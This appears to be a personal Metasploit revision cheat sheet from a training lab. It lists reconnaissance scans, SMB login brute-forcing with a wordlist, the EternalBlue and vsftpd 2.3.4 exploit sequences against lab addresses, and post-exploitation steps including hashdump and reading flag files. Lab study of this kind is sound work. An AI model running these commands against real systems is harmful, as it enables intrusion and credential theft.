# ⚡ MASTER COMMAND INDEX

## Fast Revision — Commands First

> **Goal:** Open this file when I need the command immediately.

## 🔎 Recon / Enumeration

``` bash
search portscan
use auxiliary/scanner/portscan/tcp
show options

set RHOSTS MACHINE_IP
set PORTS 1-1024,3389,8000-8100
set THREADS 10
run

nmap -sV -O MACHINE_IP
```

## 🌐 Service Scanners

``` bash
use auxiliary/scanner/netbios/nbname
set RHOSTS MACHINE_IP
run
```

``` bash
use auxiliary/scanner/http/http_version
set RHOSTS MACHINE_IP
set RPORT 8000
run
```

``` bash
use auxiliary/scanner/smb/smb_login
set RHOSTS MACHINE_IP
set SMBUSER penny
set PASS_FILE /usr/share/wordlists/MetasploitRoom/MetasploitWordlist.txt
set VERBOSE false
run
```

## 🗃️ Database

``` bash
sudo msfdb init
```

``` bash
db_status
workspace -a stratford
workspace
db_nmap -sV -O 10.48.186.74

hosts
services
services -S webfs
creds
vulns

hosts -R
services -S smb -R

db_import /path/to/nmap_scan.xml
```

## 🎯 Vulnerability Checks

``` bash
use auxiliary/scanner/smb/smb_ms17_010
set RHOSTS 10.48.186.74
run
vulns
```

``` bash
use auxiliary/scanner/ftp/ftp_anonymous
services -S ftp -R
run
```

## 🪟 EternalBlue Lab

``` bash
search eternalblue type:exploit
use 0
show options
set RHOSTS 10.48.139.95
set LHOST 10.48.116.70
exploit
```

### Meterpreter verification

``` bash
getuid
search -f flag.txt
cat c:\Users\Administrator\Desktop\flag.txt
hashdump
background
```

## 🐧 vsftpd 2.3.4 Lab

``` bash
search vsftpd
use 1
set PAYLOAD cmd/unix/interact
set RHOSTS 10.48.144.224
exploit
```

### Shell verification

``` bash
id
whoami
hostname
```

------------------------------------------------------------------------

## 🧠 Variables at a Glance

| Variable | Remember it as | |---|---| | `RHOSTS` | **Remote hosts** —
my authorized target(s) | | `RPORT` | **Remote port** | | `LHOST` |
**Local/listening host** for reverse connection | | `LPORT` |
**Local/listening port** | | `PAYLOAD` | What executes after successful
exploitation | | `THREADS` | Parallel work / scan speed |

> \[!CAUTION\] Authorized systems and training labs only.

[← Back to My Cyber Journey](README.md)
